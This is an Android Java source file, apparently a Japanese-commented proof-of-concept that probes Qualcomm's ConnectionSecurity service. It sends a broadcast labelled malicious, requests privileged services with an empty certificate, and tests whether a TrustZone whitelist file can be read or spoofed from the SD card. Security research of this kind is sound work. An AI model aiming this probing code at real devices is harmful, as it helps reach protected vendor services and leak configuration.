package com.example.tzpoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;

import java.io.File;
import java.io.FileInputStream;

public class MainActivity extends Activity {
    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private IServiceManager mServiceManager;
    private boolean mBound = false;
    private static final String TAG = "TZPoC";

    static {
        System.loadLibrary("tzpoc");
    }

    public native int callSystemNativeMethods();

    private ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            mBound = true;
            appendLog("ConnectionSecurityService にバインド成功");
            testServiceManager();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mBound = false;
            mServiceManager = null;
            appendLog("サービス切断");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tvStatus.setText("実行中...");
                // 1. BroadcastReceiver を起動
                sendMaliciousBroadcast();
                // 2. サービスにバインド
                bindToConnectionSecurityService();
                // 3. ネイティブライブラリを呼び出し
                int nativeResult = callSystemNativeMethods();
                appendLog("Native call result: " + nativeResult);
                // 4. ホワイトリストファイルの検証 (リダイレクト可能性)
                testWhitelistFileRedirection();
                btnStop.setEnabled(true);
            }
        });

        btnStop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mBound) {
                    unbindService(mConnection);
                    mBound = false;
                }
                tvStatus.setText("停止しました");
                appendLog("ユーザーにより停止");
                btnStop.setEnabled(false);
            }
        });
    }

    private void sendMaliciousBroadcast() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "com.qualcomm.qti.qms.service.connectionsecurity",
                    "com.qualcomm.qti.qms.service.connectionsecurity.ConnSecBroadcastReceiver"
            ));
            sendBroadcast(intent);
            appendLog("Broadcast 送信: ConnSecBroadcastReceiver");
        } catch (Exception e) {
            appendLog("Broadcast エラー: " + e.getMessage());
        }
    }

    private void bindToConnectionSecurityService() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.qualcomm.qti.qms.service.connectionsecurity",
                "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService"
        ));
        boolean ret = bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
        appendLog("bindService 結果: " + ret);
    }

    private void testServiceManager() {
        if (mServiceManager == null) {
            appendLog("ServiceManager が null");
            return;
        }
        try {
            byte[] dummyCert = new byte[0];
            int[] status = new int[1];

            IBinder wifiBinder = mServiceManager.getService("wifi-service2", dummyCert, status);
            appendLog("getService(wifi-service2) -> binder=" + wifiBinder + ", status=" + status[0]);

            status[0] = 0;
            IBinder rticBinder = mServiceManager.getService("rtic-service", dummyCert, status);
            appendLog("getService(rtic-service) -> binder=" + rticBinder + ", status=" + status[0]);

        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    /**
     * ホワイトリストファイルのリダイレクト可能性を検証
     * CredentialHelper が読み込む /vendor/etc/ssg/tz_whitelist.json を
     * /sdcard/tz_whitelist.json に置き換え可能かチェックする
     */
    private void testWhitelistFileRedirection() {
        appendLog("=== ホワイトリストファイル検証開始 ===");

        // 1. 元のベンダーファイルの状態を確認
        File vendorFile = new File("/vendor/etc/ssg/tz_whitelist.json");
        boolean vendorExists = vendorFile.exists();
        boolean vendorCanRead = vendorFile.canRead();
        boolean vendorCanWrite = vendorFile.canWrite();
        appendLog("Vendor file exists: " + vendorExists);
        appendLog("Vendor file readable: " + vendorCanRead);
        appendLog("Vendor file writable: " + vendorCanWrite);

        // 2. 読み取り可能であれば、内容の一部を表示 (情報漏洩リスクの実証)
        if (vendorExists && vendorCanRead) {
            try (FileInputStream fis = new FileInputStream(vendorFile)) {
                byte[] data = new byte[fis.available()];
                int readLen = fis.read(data);
                if (readLen > 0) {
                    String content = new String(data, 0, Math.min(readLen, 500));
                    appendLog("Vendor whitelist snippet: " + content);
                    // JSON構造を簡易表示 (パーミッション→クラスIDマッピング)
                    if (content.contains("whitelist") && content.contains("permissions")) {
                        appendLog("→ ホワイトリスト設定が含まれています (情報漏洩の可能性)");
                    }
                }
            } catch (Exception e) {
                appendLog("Read vendor file error: " + e.getMessage());
            }
        } else {
            appendLog("Vendor file が存在しない、または読み取り不可 (SELinux/パーミッションで制限)");
        }

        // 3. SDカード上の偽装ファイルを確認 (攻撃者が配置できるか)
        File sdcardFile = new File("/sdcard/tz_whitelist.json");
        boolean sdcardExists = sdcardFile.exists();
        boolean sdcardCanRead = sdcardFile.canRead();
        appendLog("Sdcard file exists: " + sdcardExists);
        appendLog("Sdcard file readable: " + sdcardCanRead);

        // 4. リダイレクトの実現性を評価
        if (sdcardExists) {
            appendLog("警告: /sdcard/tz_whitelist.json が存在します");
            try (FileInputStream fis = new FileInputStream(sdcardFile)) {
                byte[] data = new byte[fis.available()];
                fis.read(data);
                String content = new String(data);
                appendLog("Sdcard file content: " + content.substring(0, Math.min(100, content.length())) + "...");
            } catch (Exception e) {
                appendLog("Read sdcard error: " + e.getMessage());
            }
        }

        // 5. 最終結論
        appendLog("=== 検証結論 ===");
        if (vendorCanWrite) {
            appendLog("【高危険】ベンダーファイルに書き込み可能です！ルート化またはSELinux無効化の可能性があります。");
        } else {
            appendLog("ベンダーファイルは書き込み不可 (読み取り専用パーティション)");
        }

        if (sdcardExists) {
            appendLog("SDカードに偽装ファイルが存在しますが、CredentialHelper はハードコードされたパスを読み込むため、");
            appendLog("このファイルを直接読み込むことはありません。リダイレクトは 不可能 です。");
            appendLog("(システムの再マウントやシンボリックリンク攻撃には root 権限が必要)");
        } else {
            appendLog("SDカードに偽装ファイルはありません。");
        }
        appendLog("情報漏洩リスク: " + (vendorCanRead ? "あり (ファイルが読み取り可能)" : "なし"));
        appendLog("リダイレクト/置き換えリスク: ルート化端末以外では実質的に不可能");
    }

    private void appendLog(String msg) {
        tvLog.append(msg + "\n");
        Log.d(TAG, msg);
    }
}
